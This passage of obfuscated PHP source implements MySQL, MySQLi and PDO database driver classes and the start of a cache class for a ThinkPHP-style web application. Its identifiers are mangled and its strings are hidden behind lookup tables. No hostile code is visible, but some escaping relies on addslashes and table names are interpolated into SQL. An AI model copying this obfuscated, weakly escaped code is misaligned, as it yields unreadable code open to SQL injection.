array_keys($õ¯ËÂÎ¥[0]); $ï§äĞÎ¡ = array(); foreach ($õ¯ËÂÎ¥ as $µ’Ó‰¥Ï) { $ƒÛÆûŠ = array(); foreach ($µ’Ó‰¥Ï as $“°à†½ì => $à¢™äü) { $à¢™äü = $this->parseValue($à¢™äü); if (is_scalar($à¢™äü)) { $ƒÛÆûŠ[] = $à¢™äü; } } $ï§äĞÎ¡[] = $…‰ö«”¤[338] . implode($…‰ö«”¤[50], $ƒÛÆûŠ) . $…‰ö«”¤[1005]; } array_walk($ğÀ³é·, array($this, $…‰ö«”¤[1006])); $¹àœÄö¯ = $èÜåıÛ· ? $…‰ö«”¤[1007] : $…‰ö«”¤[1008]; $¹àœÄö¯ = $…‰ö«”¤[1008]; $ªÛ÷ÎÚî = $¹àœÄö¯ . $…‰ö«”¤[1009] . $this->parseTable($†¢ÕÆ£ò[$…‰ö«”¤[358]]) . $…‰ö«”¤[1003] . implode($…‰ö«”¤[50], $ğÀ³é·) . $…‰ö«”¤[1010] . implode($…‰ö«”¤[50], $ï§äĞÎ¡); if ($èÜåıÛ·) { $İéûÏ”ø = array(); foreach ($ğÀ³é· as $“°à†½ì) { if ($“°à†½ì == $…‰ö«”¤[232] || $“°à†½ì == $…‰ö«”¤[1011]) { continue; } $İéûÏ”ø[] = $“°à†½ì . $…‰ö«”¤[1012] . $“°à†½ì . $…‰ö«”¤[1005]; } $ªÛ÷ÎÚî .= $…‰ö«”¤[1013] . implode($…‰ö«”¤[50], $İéûÏ”ø); } return $this->execute($ªÛ÷ÎÚî); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $îèä©¨¤ =& $_SERVER[¿ÈˆÑ¸ä]; $this->error = mysql_errno() . $îèä©¨¤[4] . mysql_error($this->_linkID); if ($îèä©¨¤[12] != $this->queryStr) { $this->error .= LNG($îèä©¨¤[48]) . $this->queryStr; } think_trace($this->error, $îèä©¨¤[12], $îèä©¨¤[49]); return $this->error; } public function escapeString($€Ä¤¹¨ó) { if ($this->_linkID) { return mysql_real_escape_string($€Ä¤¹¨ó, $this->_linkID); } else { return mysql_escape_string($€Ä¤¹¨ó); } } public function parseKey(&$¼ˆŒ•şü, $¹Êíç¬² = true) { $øàÙäùã =& $_SERVER[¿ÈˆÑ¸ä]; if ($¹Êíç¬²) { $¼ˆŒ•şü = $this->parseKeyCheck($¼ˆŒ•şü); } if ($¼ˆŒ•şü != $øàÙäùã[221] && !preg_match($øàÙäùã[1014], $¼ˆŒ•şü)) { $¼ˆŒ•şü = $øàÙäùã[472] . trim($¼ˆŒ•şü, $øàÙäùã[472]) . $øàÙäùã[472]; } return $¼ˆŒ•şü; } } class DbMysqli extends Db { public function __construct($ªÎµÀº” = '') { $›ú–şúé =& $_SERVER[¿ÈˆÑ¸ä]; if (!extension_loaded($›ú–şúé[1015])) { think_exception(think_lang($›ú–şúé[14]) . $›ú–şúé[1016]); } if (!empty($ªÎµÀº”)) { $this->config = $ªÎµÀº”; if (empty($this->config[$›ú–şúé[17]])) { $this->config[$›ú–şúé[17]] = $›ú–şúé[12]; } } } public function connect($²À³Ã¯‹ = '', $ÃªÓ“·Ô = 0) { $ëòÊúÍ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->linkID[$ÃªÓ“·Ô])) { if (empty($²À³Ã¯‹)) { $²À³Ã¯‹ = $this->config; } $this->linkID[$ÃªÓ“·Ô] = new mysqli($²À³Ã¯‹[$ëòÊúÍ[986]], $²À³Ã¯‹[$ëòÊúÍ[988]], $²À³Ã¯‹[$ëòÊúÍ[989]], $²À³Ã¯‹[$ëòÊúÍ[21]], $²À³Ã¯‹[$ëòÊúÍ[987]] ? intval($²À³Ã¯‹[$ëòÊúÍ[987]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÍÕö õê = $this->linkID[$ÃªÓ“·Ô]->server_version; $this->linkID[$ÃªÓ“·Ô]->query($ëòÊúÍ[990] . think_config($ëòÊúÍ[991]) . $ëòÊúÍ[58]); if ($ÍÕö õê > $ëòÊúÍ[992]) { $this->linkID[$ÃªÓ“·Ô]->query($ëòÊúÍ[993]); } $this->connected = !0; if (1 != think_config($ëòÊúÍ[22])) { unset($this->config); } } return $this->linkID[$ÃªÓ“·Ô]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ö²Ïƒ×) { $øĞúåÙ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ö²Ïƒ×; if ($this->queryID) { $this->free(); } think_action_status($øĞúåÙ[23], 1); think_status($øĞúåÙ[24]); $this->queryID = $this->_linkID->query($Ö²Ïƒ×); if ($this->_linkID->more_results()) { while (($·–áü·§ = $this->_linkID->next_result()) != NULL) { $·–áü·§->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($”¯Ã¬ÄÆ) { $èğ©ŞÂŸ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”¯Ã¬ÄÆ; if ($this->queryID) { $this->free(); } think_action_status($èğ©ŞÂŸ[25], 1); think_status($èğ©ŞÂŸ[24]); $âƒ¡…Ë´ = $this->_linkID->query($”¯Ã¬ÄÆ); $this->debug(); if (!1 === $âƒ¡…Ë´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—ˆí”êÙ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$—ˆí”êÙ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŞÎ—Ò£ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ŞÎ—Ò£) { $this->error(); return !1; } } return !0; } private function getAll() { $ƒéÇÖ‰ = array(); if ($this->numRows > 0) { for ($®ê‡…àğ = 0; $®ê‡…àğ < $this->numRows; $®ê‡…àğ++) { $ƒéÇÖ‰[$®ê‡…àğ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ƒéÇÖ‰; } public function getFields($ÎÔİ²Íƒ) { $˜«˜ô˜Á =& $_SERVER[¿ÈˆÑ¸ä]; $Šö…•œ = $this->query($˜«˜ô˜Á[997] . $this->parseKey($ÎÔİ²Íƒ)); $¿ìüÎá  = array(); if ($Šö…•œ) { foreach ($Šö…•œ as $šğ•¸½æ => $ƒÙ´¾™) { $¿ìüÎá [$ƒÙ´¾™[$˜«˜ô˜Á[31]]] = array($˜«˜ô˜Á[32] => $ƒÙ´¾™[$˜«˜ô˜Á[31]], $˜«˜ô˜Á[33] => $ƒÙ´¾™[$˜«˜ô˜Á[34]], $˜«˜ô˜Á[35] => (bool) ($ƒÙ´¾™[$˜«˜ô˜Á[36]] === $˜«˜ô˜Á[12]), $˜«˜ô˜Á[37] => $ƒÙ´¾™[$˜«˜ô˜Á[38]], $˜«˜ô˜Á[39] => strtolower($ƒÙ´¾™[$˜«˜ô˜Á[40]]) == $˜«˜ô˜Á[41], $˜«˜ô˜Á[42] => strtolower($ƒÙ´¾™[$˜«˜ô˜Á[43]]) == $˜«˜ô˜Á[44]); } } return $¿ìüÎá ; } public function getTables($›ÙÌÓ„© = '') { $ÅöúüœĞ =& $_SERVER[¿ÈˆÑ¸ä]; $‡Û’êÏÙ = !empty($›ÙÌÓ„©) ? $ÅöúüœĞ[999] . $›ÙÌÓ„© . $ÅöúüœĞ[1000] : $ÅöúüœĞ[1001]; $Î‚Ğ—Ì• = $this->query($‡Û’êÏÙ); $§Õ†É¼ = array(); if ($Î‚Ğ—Ì•) { foreach ($Î‚Ğ—Ì• as $¸¸ÅÎô½ => $ãí„¼»ƒ) { $§Õ†É¼[$¸¸ÅÎô½] = current($ãí„¼»ƒ); } } return $§Õ†É¼; } public function replace($¯è¤î‘‘, $ê¬›íÄ¼ = array()) { $Ûëç¡İ =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($¯è¤î‘‘ as $»Ğãó¾ => $²Š­¨ñÍ) { $Ò×ÎÕ = $this->parseValue($²Š­¨ñÍ); if (is_scalar($Ò×ÎÕ)) { $Ë­ˆ¶ÄÏ[] = $Ò×ÎÕ; $¯óÀ“÷[] = $this->parseKey($»Ğãó¾); } } $ü¥Ñœ = $Ûëç¡İ[1002] . $this->parseTable($ê¬›íÄ¼[$Ûëç¡İ[358]]) . $Ûëç¡İ[1003] . implode($Ûëç¡İ[50], $¯óÀ“÷) . $Ûëç¡İ[1004] . implode($Ûëç¡İ[50], $Ë­ˆ¶ÄÏ) . $Ûëç¡İ[1005]; return $this->execute($ü¥Ñœ); } public function insertAll($¹”Š‰øá, $ˆëı¨ñ“ = array(), $’ı×“œâ = false) { $¡Û†·•ê =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($¹”Š‰øá[0])) { return !1; } $šÆ¼Ëˆ“ = array_keys($¹”Š‰øá[0]); $ï‰¥ĞÜ = array(); foreach ($¹”Š‰øá as $È¥øø) { $ı–É’™ = array(); foreach ($È¥øø as $”Üğß˜» => $ÑÖøéæ¦) { $ÑÖøéæ¦ = $this->parseValue($ÑÖøéæ¦); if (is_scalar($ÑÖøéæ¦)) { $ı–É’™[] = $ÑÖøéæ¦; } } $ï‰¥ĞÜ[] = $¡Û†·•ê[338] . implode($¡Û†·•ê[50], $ı–É’™) . $¡Û†·•ê[1005]; } array_walk($šÆ¼Ëˆ“, array($this, $¡Û†·•ê[1006])); $Æ±ßÍ˜ê = $’ı×“œâ ? $¡Û†·•ê[1007] : $¡Û†·•ê[1008]; $Æ±ßÍ˜ê = $¡Û†·•ê[1008]; $Ûı†’¯‡ = $Æ±ßÍ˜ê . $¡Û†·•ê[1009] . $this->parseTable($ˆëı¨ñ“[$¡Û†·•ê[358]]) . $¡Û†·•ê[1003] . implode($¡Û†·•ê[50], $šÆ¼Ëˆ“) . $¡Û†·•ê[1010] . implode($¡Û†·•ê[50], $ï‰¥ĞÜ); if ($’ı×“œâ) { $¤‹¿Æ¢ñ = array(); foreach ($šÆ¼Ëˆ“ as $”Üğß˜») { if ($”Üğß˜» == $¡Û†·•ê[232] || $”Üğß˜» == $¡Û†·•ê[1011]) { continue; } $¤‹¿Æ¢ñ[] = $”Üğß˜» . $¡Û†·•ê[1012] . $”Üğß˜» . $¡Û†·•ê[1005]; } $Ûı†’¯‡ .= $¡Û†·•ê[1013] . implode($¡Û†·•ê[50], $¤‹¿Æ¢ñ); } return $this->execute($Ûı†’¯‡); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $µÀè–ø™ =& $_SERVER[¿ÈˆÑ¸ä]; $this->error = $this->_linkID->errno . $µÀè–ø™[4] . $this->_linkID->error; if ($µÀè–ø™[12] != $this->queryStr) { $this->error .= LNG($µÀè–ø™[48]) . $this->queryStr; } think_trace($this->error, $µÀè–ø™[12], $µÀè–ø™[49]); return $this->error; } public function escapeString($¨¡Êä†) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¨¡Êä†); } else { return addslashes($¨¡Êä†); } } public function parseKey(&$µ¢¯Ò‹ı, $Ì³¨§  = true) { $‡¤‚â =& $_SERVER[¿ÈˆÑ¸ä]; if ($Ì³¨§ ) { $µ¢¯Ò‹ı = $this->parseKeyCheck($µ¢¯Ò‹ı); } if ($µ¢¯Ò‹ı != $‡¤‚â[221] && !preg_match($‡¤‚â[1014], $µ¢¯Ò‹ı)) { $µ¢¯Ò‹ı = $‡¤‚â[472] . trim($µ¢¯Ò‹ı, $‡¤‚â[472]) . $‡¤‚â[472]; } return $µ¢¯Ò‹ı; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($½ĞÒÑ÷° = '') { $õÒì¡Ö· =& $_SERVER[¿ÈˆÑ¸ä]; if (!class_exists($õÒì¡Ö·[1017])) { think_exception(think_lang($õÒì¡Ö·[14]) . $õÒì¡Ö·[1018]); } if (!empty($½ĞÒÑ÷°)) { $this->config = $½ĞÒÑ÷°; if (empty($this->config[$õÒì¡Ö·[17]])) { $this->config[$õÒì¡Ö·[17]] = array(); } } } public function connect($ÇÆºÁÌ° = '', $ğ‰—Ğ©µ = 0) { $‡áûÁ™‘ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->linkID[$ğ‰—Ğ©µ])) { if (empty($ÇÆºÁÌ°)) { $ÇÆºÁÌ° = $this->config; } $‡ª”‡ˆÛ = !empty($ÇÆºÁÌ°[$‡áûÁ™‘[17]][$‡áûÁ™‘[18]]) ? $ÇÆºÁÌ°[$‡áûÁ™‘[17]][$‡áûÁ™‘[18]] : $this->pconnect; if ($‡ª”‡ˆÛ) { $ÇÆºÁÌ°[$‡áûÁ™‘[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ğ‰—Ğ©µ] = new PDO($ÇÆºÁÌ°[$‡áûÁ™‘[1019]], $ÇÆºÁÌ°[$‡áûÁ™‘[988]], $ÇÆºÁÌ°[$‡áûÁ™‘[989]], $ÇÆºÁÌ°[$‡áûÁ™‘[17]]); } catch (PDOException $é¬ÑŞøì) { think_exception($é¬ÑŞøì->getMessage()); } $this->dbType = $this->_getDsnType($ÇÆºÁÌ°[$‡áûÁ™‘[1019]]); if (in_array($this->dbType, array($‡áûÁ™‘[1020], $‡áûÁ™‘[1021], $‡áûÁ™‘[1022], $‡áûÁ™‘[1023]))) { think_exception($‡áûÁ™‘[1024] . $this->dbType . $‡áûÁ™‘[1025] . $this->dbType . $‡áûÁ™‘[1026]); } if (!$this->linkID[$ğ‰—Ğ©µ]) { think_exception($‡áûÁ™‘[1027]); } try { $this->linkID[$ğ‰—Ğ©µ]->exec($‡áûÁ™‘[1028] . think_config($‡áûÁ™‘[991])); } catch (Exception $é¬ÑŞøì) { } $this->connected = !0; if (1 != think_config($‡áûÁ™‘[22])) { unset($this->config); } } return $this->linkID[$ğ‰—Ğ©µ]; } public function free() { $this->PDOStatement = null; } public function query($±ÇÉ¡ì, $—˜Ë÷áø = array()) { $ÑŞıôßî =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±ÇÉ¡ì; if (!empty($—˜Ë÷áø)) { $this->queryStr .= $ÑŞıôßî[1029] . print_r($—˜Ë÷áø, !0) . $ÑŞıôßî[1030]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÑŞıôßî[23], 1); think_status($ÑŞıôßî[24]); $this->PDOStatement = $this->_linkID->prepare($±ÇÉ¡ì); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‰ˆ çİ¸ = $this->PDOStatement->execute($—˜Ë÷áø); $this->debug(); if (!1 === $‰ˆ çİ¸) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ø€ó£¸, $Õäİèì = array()) { $ßÛœ„×¸ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ø€ó£¸; if (!empty($Õäİèì)) { $this->queryStr .= $ßÛœ„×¸[1029] . print_r($Õäİèì, !0) . $ßÛœ„×¸[1030]; } $íÉÕÇœí = !1; if ($this->dbType == $ßÛœ„×¸[1023]) { if (preg_match($ßÛœ„×¸[1031], $this->queryStr, $æ¾ŠšÚä)) { $this->table = think_config($ßÛœ„×¸[1032]) . str_ireplace(think_config($ßÛœ„×¸[1033]), $ßÛœ„×¸[463], $æ¾ŠšÚä[2]); $íÉÕÇœí = (bool) $this->query($ßÛœ„×¸[1034] . strtoupper($this->table) . $ßÛœ„×¸[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ßÛœ„×¸[25], 1); think_status($ßÛœ„×¸[24]); $this->PDOStatement = $this->_linkID->prepare($Ø€ó£¸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ª˜ìÕ¹÷ = $this->PDOStatement->execute($Õäİèì); $this->debug(); if (!1 === $ª˜ìÕ¹÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($íÉÕÇœí || preg_match($ßÛœ„×¸[1035], $Ø€ó£¸)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şó¢Öˆò = $this->_linkID->commit(); $this->transTimes = 0; if (!$şó¢Öˆò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $öÇ¸†ßı = $this->_linkID->rollback(); $this->transTimes = 0; if (!$öÇ¸†ßı) { $this->error(); return !1; } } return !0; } private function getAll() { $¡İÅ¨‰ë = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¡İÅ¨‰ë); return $¡İÅ¨‰ë; } public function getFields($ü…£€à) { $’©Ü÷ù =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (think_config($’©Ü÷ù[1036])) { $¬Ì‘Ê¨É = str_replace($’©Ü÷ù[1037], $ü…£€à, think_config($’©Ü÷ù[1036])); } else { switch ($this->dbType) { case $’©Ü÷ù[1020]: case $’©Ü÷ù[1038]: $¬Ì‘Ê¨É = "\x53\105\114\105\103\124\40\x20\x20\143\157\154\165\x6d\156\137\156\x61\x6d\145\x20\x61\x73\40\47\x4e\141\155\x65\47\54\x20\40\x20\144\141\x74\141\137\x74\x79\x70\145\40\141\163\x20\x27\124\171\x70\x65\47\54\40\40\x20\143\x6f\154\165\x6d\x6e\x5f\x64\145\x66\x61\165\x6c\164\40\141\x73\40\47\x44\x65\146\141\x75\154\164\47\54\40\40\x20\x69\163\x5f\156\165\154\154\141\142\x6c\145\x20\x61\163\40\47\x4e\165\x6c\154\x27\12\x9\11\x46\x52\117\115\11\x69\156\x66\157\162\155\141\164\151\157\156\137\163\x63\x68\145\155\141\56\x74\x61\x62\x6c\x65\x73\x20\x41\x53\x20\164\12\x9\x9\112\x4f\x49\116\x9\151\x6e\x66\x6f\x72\155\141\164\151\x6f\x6e\x5f\163\x63\150\145\155\x61\x2e\143\x6f\x6c\x75\x6d\156\x73\x20\x41\123\x20\x63\xa\11\11\x4f\x4e\x20\40\x74\56\164\141\142\x6c\145\x5f\143\x61\164\141\154\x6f\x67\40\x3d\40\143\x2e\x74\141\x62\x6c\145\x5f\x63\x61\164\141\x6c\x6f\147\xa\11\x9\101\x4e\104\40\164\x2e\x74\x61\x62\154\145\x5f\x73\x63\150\x65\155\x61\40\75\x20\143\56\164\141\142\x6c\x65\137\163\143\150\x65\155\141\xa\11\11\x41\x4e\104\40\164\x2e\x74\141\142\x6c\145\x5f\x6e\x61\x6d\x65\40\x3d\x20\x63\x2e\164\141\142\154\x65\137\x6e\x61\x6d\145\12\x9\x9\127\110\105\x52\x45\x20\x20\40\164\x2e\x74\x61\142\x6c\x65\x5f\156\141\155\x65\x20\x3d\40\47{$ü…£€à}\x27"; break; case $’©Ü÷ù[1039]: $¬Ì‘Ê¨É = $’©Ü÷ù[1040] . $ü…£€à . $’©Ü÷ù[1041]; break; case $’©Ü÷ù[1021]: case $’©Ü÷ù[1023]: $¬Ì‘Ê¨É = $’©Ü÷ù[1042] . $’©Ü÷ù[1043] . $’©Ü÷ù[1044] . strtoupper($ü…£€à) . $’©Ü÷ù[1045] . strtoupper($ü…£€à) . $’©Ü÷ù[1046]; break; case $’©Ü÷ù[1047]: $¬Ì‘Ê¨É = $’©Ü÷ù[1048] . $ü…£€à . $’©Ü÷ù[1049]; break; case $’©Ü÷ù[1022]: break; case $’©Ü÷ù[1050]: default: $¬Ì‘Ê¨É = $’©Ü÷ù[1051] . ($this->dbType == $’©Ü÷ù[1050] ? "\140{$ü…£€à}\x60" : $ü…£€à); } } $şİ®Ë‰ë = $this->query($¬Ì‘Ê¨É); $Ïê¾ïÑî = array(); if ($şİ®Ë‰ë) { foreach ($şİ®Ë‰ë as $ï©’ˆàç => $ÕÜĞË—û) { $ÕÜĞË—û = array_change_key_case($ÕÜĞË—û); $ÕÜĞË—û[$’©Ü÷ù[32]] = isset($ÕÜĞË—û[$’©Ü÷ù[32]]) ? $ÕÜĞË—û[$’©Ü÷ù[32]] : $’©Ü÷ù[463]; $ÕÜĞË—û[$’©Ü÷ù[33]] = isset($ÕÜĞË—û[$’©Ü÷ù[33]]) ? $ÕÜĞË—û[$’©Ü÷ù[33]] : $’©Ü÷ù[463]; $ı¦ø„à² = isset($ÕÜĞË—û[$’©Ü÷ù[352]]) ? $ÕÜĞË—û[$’©Ü÷ù[352]] : $ÕÜĞË—û[$’©Ü÷ù[32]]; $Ïê¾ïÑî[$ı¦ø„à²] = array($’©Ü÷ù[32] => $ı¦ø„à², $’©Ü÷ù[33] => $ÕÜĞË—û[$’©Ü÷ù[33]], $’©Ü÷ù[35] => (bool) (isset($ÕÜĞË—û[$’©Ü÷ù[104]]) && $ÕÜĞË—û[$’©Ü÷ù[104]] === $’©Ü÷ù[12] || isset($ÕÜĞË—û[$’©Ü÷ù[35]]) && $ÕÜĞË—û[$’©Ü÷ù[35]] === $’©Ü÷ù[12]), $’©Ü÷ù[37] => isset($ÕÜĞË—û[$’©Ü÷ù[37]]) ? $ÕÜĞË—û[$’©Ü÷ù[37]] : (isset($ÕÜĞË—û[$’©Ü÷ù[56]]) ? $ÕÜĞË—û[$’©Ü÷ù[56]] : $’©Ü÷ù[463]), $’©Ü÷ù[39] => isset($ÕÜĞË—û[$’©Ü÷ù[95]]) ? strtolower($ÕÜĞË—û[$’©Ü÷ù[95]]) == $’©Ü÷ù[41] : (isset($ÕÜĞË—û[$’©Ü÷ù[57]]) ? $ÕÜĞË—û[$’©Ü÷ù[57]] : !1), $’©Ü÷ù[42] => isset($ÕÜĞË—û[$’©Ü÷ù[1052]]) ? strtolower($ÕÜĞË—û[$’©Ü÷ù[1052]]) == $’©Ü÷ù[44] : (isset($ÕÜĞË—û[$’©Ü÷ù[95]]) ? $ÕÜĞË—û[$’©Ü÷ù[95]] : !1)); } } return $Ïê¾ïÑî; } public function getTables($ôöİÌÉŞ = '') { $åÒäš÷Ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (think_config($åÒäš÷Ğ[1053])) { $•Íö¥Ç— = str_replace($åÒäš÷Ğ[1054], $ôöİÌÉŞ, think_config($åÒäš÷Ğ[1053])); } else { switch ($this->dbType) { case $åÒäš÷Ğ[1021]: case $åÒäš÷Ğ[1023]: $•Íö¥Ç— = $åÒäš÷Ğ[1055]; break; case $åÒäš÷Ğ[1020]: case $åÒäš÷Ğ[1038]: $•Íö¥Ç— = $åÒäš÷Ğ[1056]; break; case $åÒäš÷Ğ[1047]: $•Íö¥Ç— = $åÒäš÷Ğ[1057]; break; case $åÒäš÷Ğ[1022]: think_exception(think_lang($åÒäš÷Ğ[1058]) . $åÒäš÷Ğ[1059]); break; case $åÒäš÷Ğ[1039]: $•Íö¥Ç— = $åÒäš÷Ğ[45] . $åÒäš÷Ğ[46] . $åÒäš÷Ğ[47]; break; case $åÒäš÷Ğ[1050]: default: if (!empty($ôöİÌÉŞ)) { $•Íö¥Ç— = $åÒäš÷Ğ[999] . $ôöİÌÉŞ . $åÒäš÷Ğ[1000]; } else { $•Íö¥Ç— = $åÒäš÷Ğ[1001]; } } } $¥£‚¿ı = $this->query($•Íö¥Ç—); $¿§®„¢ = array(); foreach ($¥£‚¿ı as $ú´Ÿ§ò» => $ÁÛš¬Şª) { $¿§®„¢[$ú´Ÿ§ò»] = current($ÁÛš¬Şª); } return $¿§®„¢; } protected function parseLimit($Ô²´¢™) { $ñÊ¶ü€Î =& $_SERVER[¿ÈˆÑ¸ä]; $îŸ‰‡ı• = $ñÊ¶ü€Î[12]; if (!empty($Ô²´¢™)) { switch ($this->dbType) { case $ñÊ¶ü€Î[1047]: case $ñÊ¶ü€Î[1039]: $Ô²´¢™ = explode($ñÊ¶ü€Î[50], $Ô²´¢™); if (count($Ô²´¢™) > 1) { $îŸ‰‡ı• .= $ñÊ¶ü€Î[51] . $Ô²´¢™[1] . $ñÊ¶ü€Î[52] . $Ô²´¢™[0] . $ñÊ¶ü€Î[53]; } else { $îŸ‰‡ı• .= $ñÊ¶ü€Î[51] . $Ô²´¢™[0] . $ñÊ¶ü€Î[53]; } break; case $ñÊ¶ü€Î[1020]: case $ñÊ¶ü€Î[1038]: break; case $ñÊ¶ü€Î[1022]: break; case $ñÊ¶ü€Î[1021]: case $ñÊ¶ü€Î[1023]: break; case $ñÊ¶ü€Î[1050]: default: $îŸ‰‡ı• .= $ñÊ¶ü€Î[51] . $Ô²´¢™ . $ñÊ¶ü€Î[53]; } } return $îŸ‰‡ı•; } public function parseKey(&$ÅÏ¹­Ãµ, $™”ü·¹ò = true) { $Ò‹Áè‘« =& $_SERVER[¿ÈˆÑ¸ä]; if ($™”ü·¹ò) { $ÅÏ¹­Ãµ = $this->parseKeyCheck($ÅÏ¹­Ãµ); } if ($this->dbType == $Ò‹Áè‘«[1050]) { if ($ÅÏ¹­Ãµ != $Ò‹Áè‘«[221] && !preg_match($Ò‹Áè‘«[1014], $ÅÏ¹­Ãµ)) { $ÅÏ¹­Ãµ = $Ò‹Áè‘«[472] . trim($ÅÏ¹­Ãµ, $Ò‹Áè‘«[472]) . $Ò‹Áè‘«[472]; } return $ÅÏ¹­Ãµ; } else { return parent::parseKey($ÅÏ¹­Ãµ, $™”ü·¹ò); } } public function close() { $this->_linkID = null; } public function error() { $˜ÓÓù…í =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->PDOStatement) { $©áÍŸ¼— = $this->PDOStatement->errorInfo(); $this->error = $©áÍŸ¼—[1] . $˜ÓÓù…í[4] . $©áÍŸ¼—[2]; } else { $this->error = $˜ÓÓù…í[12]; } if ($˜ÓÓù…í[12] != $this->queryStr) { $this->error .= LNG($˜ÓÓù…í[48]) . $this->queryStr; } think_trace($this->error, $˜ÓÓù…í[12], $˜ÓÓù…í[49]); return $this->error; } public function escapeString($Ó•³’Š“) { $Ê¬³£Š =& $_SERVER[¿ÈˆÑ¸ä]; switch ($this->dbType) { case $Ê¬³£Š[1047]: case $Ê¬³£Š[1020]: case $Ê¬³£Š[1038]: case $Ê¬³£Š[1050]: return addslashes($Ó•³’Š“); case $Ê¬³£Š[1022]: case $Ê¬³£Š[1039]: case $Ê¬³£Š[1021]: case $Ê¬³£Š[1023]: return str_ireplace($Ê¬³£Š[58], $Ê¬³£Š[59], $Ó•³’Š“); } } protected function parseValue($¥Í“íš°) { $ê¢‹Ÿù =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($¥Í“íš°)) { $—êÖÑü = strpos($¥Í“íš°, $ê¢‹Ÿù[4]) === 0 && in_array($¥Í“íš°, array_keys($this->bind)); $¥Í“íš° = $—êÖÑü ? $this->escapeString($¥Í“íš°) : $ê¢‹Ÿù[1060] . $this->escapeString($¥Í“íš°) . $ê¢‹Ÿù[1060]; } elseif (isset($¥Í“íš°[0]) && is_string($¥Í“íš°[0]) && strtolower($¥Í“íš°[0]) == $ê¢‹Ÿù[373]) { $¥Í“íš° = $this->escapeString($¥Í“íš°[1]); } elseif (is_array($¥Í“íš°)) { $¥Í“íš° = array_map(array($this, $ê¢‹Ÿù[1061]), $¥Í“íš°); } elseif (is_bool($¥Í“íš°)) { $¥Í“íš° = $¥Í“íš° ? $ê¢‹Ÿù[91] : $ê¢‹Ÿù[229]; } elseif (is_null($¥Í“íš°)) { $¥Í“íš° = $ê¢‹Ÿù[104]; } return $¥Í“íš°; } public function getLastInsertId() { $‘º¼¼²Î =& $_SERVER[¿ÈˆÑ¸ä]; switch ($this->dbType) { case $‘º¼¼²Î[1047]: case $‘º¼¼²Î[1039]: case $‘º¼¼²Î[1020]: case $‘º¼¼²Î[1038]: case $‘º¼¼²Î[1022]: case $‘º¼¼²Î[1050]: return $this->_linkID->lastInsertId(); case $‘º¼¼²Î[1021]: case $‘º¼¼²Î[1023]: $É§Çùœ™ = $this->table; $Âîó±Í = $this->query("\123\105\x4c\x45\103\x54\40{$É§Çùœ™}\x2e\143\165\162\162\x76\141\154\x20\x63\x75\162\x72\166\141\x6c\x20\x46\122\117\x4d\40\x64\x75\x61\154"); return $Âîó±Í ? $Âîó±Í[0][$‘º¼¼²Î[1062]] : 0; } } } goto böíÕ¸«³; cñéÒ¬´¦İ: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $İ¢öª“ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $Ü°È‹Ç– = $GLOBALS[$İ¢öª“[6]][$İ¢öª“[425]]; $¨³Ÿ¨Ùâ = $Ü°È‹Ç–[$Ü°È‹Ç–[$İ¢öª“[918]]]; $¹‡“é±¸ = $Ü°È‹Ç–[$İ¢öª“[919]]; switch ($Ü°È‹Ç–[$İ¢öª“[918]]) { case $İ¢öª“[21]: self::$handle = Model($İ¢öª“[920]); break; case $İ¢öª“[921]: self::$handle = new CacheRedis($¨³Ÿ¨Ùâ, $¹‡“é±¸); break; case $İ¢öª“[922]: self::$handle = new CacheMemcached($¨³Ÿ¨Ùâ, $¹‡“é±¸); break; case $İ¢öª“[231]: self::$handle = new CacheFile($¨³Ÿ¨Ùâ, $¹‡“é±¸); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; 